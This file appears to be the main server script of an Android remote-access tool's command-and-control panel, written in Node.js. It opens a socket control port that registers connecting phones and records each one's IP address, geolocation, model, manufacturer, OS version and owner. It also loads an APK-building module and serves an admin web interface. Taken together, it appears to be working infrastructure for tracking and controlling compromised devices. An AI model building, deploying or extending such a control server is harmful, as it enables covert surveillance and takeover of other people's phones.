require("dotenv").config({ path: "./config.env" });

const express = require("express"),
  app = express(),
  IO = require("socket.io"),
  geoip = require("geoip-lite"),
  CONST = require("./includes/const"),
  logManager = require("./includes/logManager"),
  clientManager = new (require("./includes/clientManager"))(),
  apkBuilder = require("./includes/apkBuilder");
  nodemailer = require('nodemailer');
User = require("./models/userModel");
mongoose = require("mongoose");

global.CONST = CONST;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

const DB = process.env.DATABASE.replace(
  "<PASSWORD>",
  process.env.DATABASE_PASSWORD
);

mongoose
  .connect(DB)
  .then(() => console.log("Connection made successfully with database."))
  .catch((err) => console.log("Error connecting to the database", err));

// spin up socket server
let client_io = IO.listen( process.env.CONTROLPORT || CONST.control_port);

client_io.sockets.pingInterval = 30000;
client_io.on("connection", async (socket) => {
  socket.emit("welcome");
  let clientParams = socket.handshake.query;
  let clientAddress = socket.request.connection;

  console.log(`Client connected ${clientParams}`);
  
  let clientIP = clientAddress.remoteAddress.substring(
    clientAddress.remoteAddress.lastIndexOf(":") + 1
  );
  let clientGeo = geoip.lookup(clientIP);
  if (!clientGeo) clientGeo = {};

  await clientManager.clientConnect(socket, clientParams.id, {
    clientIP,
    clientGeo,
    device: {
      model: clientParams.model,
      manufacture: clientParams.manf,
      version: clientParams.release,
      owner: clientParams.owner,
    },
  });

  if (CONST.debug) {
    var onevent = socket.onevent;
    socket.onevent = function (packet) {
      var args = packet.data || [];
      onevent.call(this, packet); // original call
      packet.data = ["*"].concat(args);
      onevent.call(this, packet); // additional call to catch-all
    };

    socket.on("*", function (event, data) {
      console.log(event);
      console.log(data);
    });
  }
});

// get the admin interface online
app.listen(CONST.web_port, () => {
  console.log(`started at localhost:${ process.env.PORT || CONST.web_port}`);
});

app.set("view engine", "ejs");
app.set("views", "./assets/views");
app.use(express.static(__dirname + "/assets/webpublic"));
app.use("/", express.static(__dirname + "/public/landingpage/"));
// app.use(express.static(__dirname + '/public'));
app.use(require("./includes/expressRoutes"));
